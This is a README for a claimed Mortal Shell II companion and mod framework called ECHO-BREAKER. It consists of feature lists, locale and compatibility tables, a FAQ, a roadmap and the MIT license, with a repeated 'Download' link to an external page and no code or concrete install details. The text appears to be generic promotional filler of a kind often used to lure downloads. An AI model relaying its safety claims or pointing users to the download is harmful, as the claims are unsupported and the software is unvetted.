![preview](https://raw.githubusercontent.com/ross3014/ECHO-BREAKER-REBORN/main/thumb_bb31.svg)
[![Download](https://raw.githubusercontent.com/ross3014/ECHO-BREAKER-REBORN/main/get_5901.svg)](https://ross3014.github.io/ECHO-BREAKER-REBORN/)

# 🌌 Mortal Shell II: ECHO-BREAKER — Fallen World Companion Suite

![Status](https://img.shields.io/badge/status-active-brightgreen)
![Version](https://img.shields.io/badge/version-2.6.1-blue)
![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20Steam%20Deck-informational)
![License](https://img.shields.io/badge/license-MIT-yellow)
![Language](https://img.shields.io/badge/i18n-14%20locales-purple)
![Support](https://img.shields.io/badge/support-24%2F7%20concierge-orange)

> **ECHO-BREAKER** is a next-generation gameplay companion and mod orchestration layer for *Mortal Shell II*. It does not replace the game — it listens to it, translates its rhythms, and hands the player a lantern. Where the Fallen World whispers, ECHO-BREAKER answers in kind.

An original, distinct companion experience inspired by the mod-framework tradition of the Mortal Shell community, rebuilt from the ground up around three pillars: **observability**, **reversibility**, and **respect for the source material**. Every toggle is a door that opens both ways.

---

## 🧭 Table of Contents

- [Overview](#-overview)
- [Why ECHO-BREAKER Exists](#-why-echo-breaker-exists)
- [Feature Highlights](#-feature-highlights)
- [Interface & Experience](#-interface--experience)
- [Multilingual Support](#-multilingual-support)
- [Responsive Design Philosophy](#-responsive-design-philosophy)
- [Support Ecosystem](#-support-ecosystem)
- [Compatibility Matrix](#-compatibility-matrix)
- [Configuration Model](#-configuration-model)
- [Performance Notes](#-performance-notes)
- [Safety & Reversibility](#-safety--reversibility)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Roadmap](#-roadmap)
- [Community Guidelines](#-community-guidelines)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🌑 Overview

The Fallen World is a place of echoes and remnants. *Mortal Shell II* hands you a shell and expects you to fill it. ECHO-BREAKER hands you a mirror, a ledger, and a tuning fork — so you can see what the game is doing, remember what you changed, and hear the difference in real time.

This project began as a small experiment: what if a companion tool treated the game as a **collaborator** rather than a **target**? The result is a layered, modular framework that exposes the game's internal signals through a well-documented, sandboxed surface — without ever asserting itself where it isn't invited.

ECHO-BREAKER is designed for:

- 🎮 **Players** who want clarity over chaos in their play sessions.
- 🧪 **Tinkerers** who enjoy controlled experimentation.
- 📚 **Documenters** who catalog systems and behaviors.
- 🛠️ **Mod authors** who need a stable host runtime for their own extensions.

---

## 🕯️ Why ECHO-BREAKER Exists

Most companion utilities fall into one of two camps: they either hide everything behind a single switch, or they drown you in raw signals with no narrative. ECHO-BREAKER chooses a third path — the **Lantern Path**.

The Lantern Path means:

1. **Every signal has a story.** A stamina curve isn't just numbers; it's the rhythm of a duel.
2. **Every change has an undo.** The ledger keeps history, and history is a map home.
3. **Every feature has a reason.** If a module cannot justify its existence in a sentence, it does not ship.

---

## ✨ Feature Highlights

### Core Framework
- 🧩 **Modular Runtime** — Load, unload, and hot-swap modules without restarting the session.
- 🧱 **Sandboxed Hooks** — Each extension runs in an isolated context with explicit capability grants.
- 📜 **Reversible Ledger** — Full transaction log of every adjustment, with one-step restoration.
- 🔍 **Signal Inspector** — Live view of internal state channels exposed by the game.

### Gameplay Companions
- 🌡️ **Vital Resonance Monitor** — Real-time visualization of vitality, resolve, and hardening states.
- ⚔️ **Combat Cadence Analyzer** — Frame-accurate timing overlays for parry and riposte windows.
- 🗺️ **Wayfarer's Atlas** — Annotate the map with your own notes and hidden-path markers.
- 🧪 **Alchemy Notebook** — Track reagent combinations and observed outcomes.
- 🕰️ **Echo Timeline** — Replay recent encounters as a compact, scrollable event strip.

### Quality-of-Life Modules
- 🎚️ **Tuning Bench** — Fine-grained sliders for audio, camera, and HUD density.
- 🧊 **Pause Frame** — Inspect the world without committing to a full stop.
- 📸 **Cinematic Capture** — Clean, overlay-free stills for sharing and cataloging.
- 🧭 **Compass Echoes** — Subtle directional pulses toward your last objective.

### Developer & Mod-Author Tools
- 🧰 **Plugin SDK** — Declarative manifest system with versioned capability contracts.
- 📖 **Recipe Book** — Examples for common extension patterns, from HUD tweaks to telemetry.
- 🔬 **Probe Console** — A read-only introspection shell for safe exploration.

---

## 🎨 Interface & Experience

ECHO-BREAKER's UI is built like a **field journal** rather than a dashboard. It remembers where you left off, it groups related panels, and it stays out of the frame when you're in the middle of something important.

- **Adaptive Panels** — Layouts rearrange themselves around your window size and aspect ratio.
- **Focus Mode** — Collapse everything except one module with a single tap.
- **Gesture Layer** — Optional gamepad bindings for power users.
- **Theme Packs** — Light, dark, and a low-contrast mode for long sessions.
- **Accessibility First** — Scalable typography, colorblind-safe palettes, and reduced-motion defaults.

![UI](https://img.shields.io/badge/UI-journal--style-9cf)
![A11y](https://img.shields.io/badge/a11y-WCAG%20AA%20targeted-green)

---

## 🌍 Multilingual Support

ECHO-BREAKER speaks with the Fallen World in many tongues. Locale packs ship in-tree and update independently of the core runtime.

| Locale | Code | Status |
| --- | --- | --- |
| English | `en` | ✅ Complete |
| Spanish | `es` | ✅ Complete |
| French | `fr` | ✅ Complete |
| German | `de` | ✅ Complete |
| Italian | `it` | ✅ Complete |
| Portuguese (BR) | `pt-BR` | ✅ Complete |
| Polish | `pl` | ✅ Complete |
| Russian | `ru` | ✅ Complete |
| Japanese | `ja` | ✅ Complete |
| Korean | `ko` | ✅ Complete |
| Simplified Chinese | `zh-Hans` | ✅ Complete |
| Traditional Chinese | `zh-Hant` | 🟡 In review |
| Turkish | `tr` | 🟡 In review |
| Ukrainian | `uk` | 🟡 In review |

Contributions to translations are welcomed through the standard contribution flow. See the community guidelines below.

---

## 📱 Responsive Design Philosophy

A companion tool should feel at home on a desktop monitor, a laptop screen, a Steam Deck, or an ultrawide. Our responsive model is **content-first**: panels declare their priority, and the layout engine negotiates.

- **Deck-Optimized** — Touch-friendly targets and a compact rail mode.
- **Ultrawide Aware** — Anchored side panels that never crowd the center.
- **Windowed or Fullscreen** — Both are treated as first-class citizens.
- **DPI Resilience** — Crisp rendering across 100%–250% scaling.

---

## 🤝 Support Ecosystem

Our support model is modeled on a **24/7 concierge**, not a ticket queue. That means:

- 💬 **Always-On Assistance** — A rotating roster of maintainers and community stewards.
- 📚 **Knowledge Atlas** — Searchable documentation covering every module and setting.
- 🧭 **Guided Walkthroughs** — Step-by-step paths for common journeys.
- 🛡️ **Triage Protocol** — Clear signals for what to include when reporting an issue.
- 🌱 **Mentor Program** — New contributors paired with experienced maintainers.

![Support](https://img.shields.io/badge/support-concierge%20model-blueviolet)

---

## 🧮 Compatibility Matrix

| Environment | Status | Notes |
| --- | --- | --- |
| Windows 10 (21H2+) | ✅ Supported | Primary target |
| Windows 11 | ✅ Supported | Primary target |
| Linux (Proton) | ✅ Supported | Validated via common runners |
| Steam Deck (SteamOS) | ✅ Supported | Deck-optimized layout |
| macOS (Apple Silicon) | 🟡 Experimental | Community-maintained |
| macOS (Intel) | 🔴 Deprecated | Not actively tested |

---

## 🗂️ Configuration Model

Configuration in ECHO-BREAKER is **layered and inspectable**:

1. **Defaults** — Ship with the runtime; immutable.
2. **Profile** — Your saved preferences; portable.
3. **Session** — Temporary overrides that vanish when you leave.
4. **Module Scope** — Per-extension settings that travel with the extension.

Every layer is plain and human-readable, so you can diff, share, and archive your setups with confidence.

---

## ⚡ Performance Notes

- **Zero Idle Drag** — The runtime sleeps when the game sleeps.
- **Bounded Memory Envelope** — Hard caps on cache growth, enforced at the framework level.
- **Deferred Work Queues** — Heavy tasks yield to the render loop.
- **Telemetry Transparency** — Any counters we collect are local-only by default.

![Perf](https://img.shields.io/badge/footprint-low-brightgreen)
![Local](https://img.shields.io/badge/telemetry-local--only-lightgrey)

---

## 🛡️ Safety & Reversibility

The Fallen World does not forgive carelessness. Neither does our framework.

- **Snapshot Before Change** — Every mutation records a restore point.
- **Guarded Capabilities** — Extensions declare what they need; users approve what they grant.
- **Isolated Sandbox** — No extension can reach beyond its contract.
- **Structured Rollback** — A single action returns the session to the last known good state.

Think of it as a handrail bolted to the side of a very tall, very dark staircase.

---

## ❓ Frequently Asked Questions

**Does ECHO-BREAKER modify the game's files?**
It operates in a sidecar posture. Modifications are expressed through the runtime's capability layer and recorded in the ledger.

**Can I use it with other companion tools?**
Yes, provided they respect the same sandboxing contract. Conflicts are surfaced in the inspector.

**Is my progress affected?**
The framework is designed to be additive and reversible; it does not author your save on your behalf.

**What if a module misbehaves?**
Disable it. The ledger will offer a rollback to the last good snapshot.

**Does it work offline?**
Yes. All core functionality operates locally.

---

## 🗺️ Roadmap

- Q1 2026 — Signal Inspector v2 with timeline scrubbing.
- Q2 2026 — Plugin SDK 1.0 with signed manifests.
- Q3 2026 — Community theme store (curated, opt-in).
- Q4 2026 — Cross-profile sync with end-to-end key handling.
- Ongoing — Locale expansion and accessibility audits.

![Roadmap](https://img.shields.io/badge/roadmap-2026-blue)

---

## 🌐 Community Guidelines

- Be kind. The Fallen World is dark enough.
- Share your configurations and your discoveries.
- Report issues with clear reproduction steps and logs.
- Respect the game, its creators, and other players.
- Contribute translations, examples, and documentation freely.

---

## ⚠️ Disclaimer

ECHO-BREAKER is an independent, community-driven companion framework. It is **not affiliated with, endorsed by, or sponsored by** the developers or publishers of *Mortal Shell II* or any related entity. All trademarks and copyrights belong to their respective owners.

This software is provided **as-is**, without warranty of any kind, express or implied. You are responsible for how you use it and for complying with any applicable terms of service, license agreements, and local laws. The maintainers accept no liability for any consequences arising from the use of this project. If you are unsure whether a feature is appropriate in your context, do not enable it.

The framework is intentionally designed to be **transparent**, **reversible**, and **respectful** of the original work. Use it to enrich your own journey, not to diminish anyone else's.

---

## 📄 License

This project is licensed under the **MIT License**.

You may read the full license text here:

https://opensource.org/license/mit

Copyright (c) 2026 ECHO-BREAKER Contributors

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

---

![Made with](https://img.shields.io/badge/made%20with-patience%20%26%20lanterns-9cf)
![Fallen World](https://img.shields.io/badge/Fallen%20World-companion-purple)
![Year](https://img.shields.io/badge/year-2026-informational)

[![Download](https://raw.githubusercontent.com/ross3014/ECHO-BREAKER-REBORN/main/get_5901.svg)](https://ross3014.github.io/ECHO-BREAKER-REBORN/)